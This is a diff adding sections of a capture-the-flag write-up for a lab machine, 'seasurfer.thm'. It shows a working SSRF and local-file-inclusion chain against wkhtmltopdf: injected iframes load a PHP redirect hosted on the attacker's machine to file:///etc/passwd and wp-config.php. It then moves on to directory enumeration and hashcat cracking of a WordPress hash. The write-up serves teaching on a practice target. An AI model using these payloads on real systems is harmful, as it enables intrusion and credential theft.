@@ -76,7 +76,133 @@ Checking the website, there's only a default template page. But looking at the h
 [...]
 ```
 
-
 We add this domain to our hosts file with `echo "10.18.72.160   seasurfer.thm" >> /etc/hosts`.
 
+![](images/2.PNG)
+
 We click around the website. Check all the posts and info. It says it was made by "kyle", we'll keep that info for later. The comments also reveal a subdomain, which we also add to our hosts file with `echo "10.18.72.160   internal.seasurfer.thm" >> /etc/hosts`.
+
+![](images/3.PNG)
+
+## SSRF and LFI
+
+The "internal" subdomain appears to generate PDFs based on the form. 
+
+![](images/4.PNG)
+
+We can try to inject <h1>asdf</h1> in a field to see if it will display in the outputted PDF file. It does. We can potentially attack this with SSRF or local file inclusion. Trying `<iframe height="2000" width="800" src="file:///etc/passwd"></iframe>` doesn't work though.
+
+![](images/5.PNG)
+
+Looking at the properties of the pdf file (on chrome: three dots top right corner > document properties), we see that the website uses wkhtmltopdf to generate the pdfs from this form.
+
+```
+Document properties
+File name:      29012023-9OZtn8ojlr6zLl4zY3mI.pdf
+File size:	    52.9 KB
+Title:          Receipt
+Author:	        -
+Subject:	      -
+Keywords:	      -
+Created:	      1/29/23, 3:35:48 PM
+Modified:	      -
+Application:   	wkhtmltopdf 0.12.5
+PDF producer: 	Qt 4.8.7
+PDF version:  	1.4
+Page count: 	  1
+Page size:  	  8.26 × 11.69 in (portrait)
+Fast web view:	No
+```
+
+A quick search reveals that this program is vulnerable to local file inclusion and SSRF. We can try to get the server to read us some data.
+
+On kali, we host a file by running `service apache2 start`. Then we create a payload in /var/www/html/ named payload.php.
+```php
+<?php
+     header('location:file:///etc/passwd');
+?>
+```
+
+We put this into one of the fields in the form and submit it.
+```html
+<iframe height="2000" width="800" src=http://KALI_IP/payload.php></iframe>
+<iframe height="2000" width="800" src="http://KALI_IP/payload.php"></iframe>
+```
+
+Success. We can read /etc/passwd.
+
+![](images/6.PNG)
+
+We edit the payload to see what user is running.
+
+```php
+<?php
+     header('location:file:///proc/self/status');
+?>
+```
+
+Uid 33 33 = www-data from the /etc/passwd we got earlier.
+
+![](images/7.PNG)
+
+Tried to see if we can access logs for Log Poisoning. Fruitless, just gives a blank iframe.
+```
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/vsftpd.log
+/var/log/apache2/error.log
+```
+
+Tried to read wp-config.php. We know that the website is being run out of /var/www, so the file is somewhere in the directory/subdirectory. The last one worked.
+```
+/var/www/wp-config.php
+/var/www/html/wp-config.php
+/var/www/seasurfer/wp-config.php
+/var/www/wordpress/wp-config.php
+```
+
+wp-config.php gives us database credentials.
+```
+[...]
+define( 'DB_NAME', 'wordpress' );
+/** Database username */
+define( 'DB_USER', 'wordpressuser' );
+/** Database password */
+define( 'DB_PASSWORD', 'coolDataTablesMan' );
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+[...]
+```
+
+![](images/8.PNG)
+
+## Enumeration and Credentials
+
+Enumerating seasurfer.thm with `gobuster dir -u seasurfer.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt` reveals the usual wp login pages, as well as /adminer, which appears to be the database for these credentials.
+
+![](images/4.1.PNG)
+
+We log in to the database.
+
+![](images/9.PNG)
+
+We can see the users table.
+
+![](images/10.PNG)
+
+Lets grab the hash from kyle and crack it with `hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt`.
+
+cracked.txt
+```
+$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/:jenny4ever
+```
+
+Note that can also just change kyle's password. WP uses a Portable PHP hash. This website does it for us: http://scriptserver.mainframe8.com/wordpress_password_hasher.php
+
+![](images/11.PNG)
+
+We can change the hash in the database to "password", or `$P$BIaoue8/jCS/3qVUc3JVPSvXzvmdt.1`. Not necessary since we already cracked it.
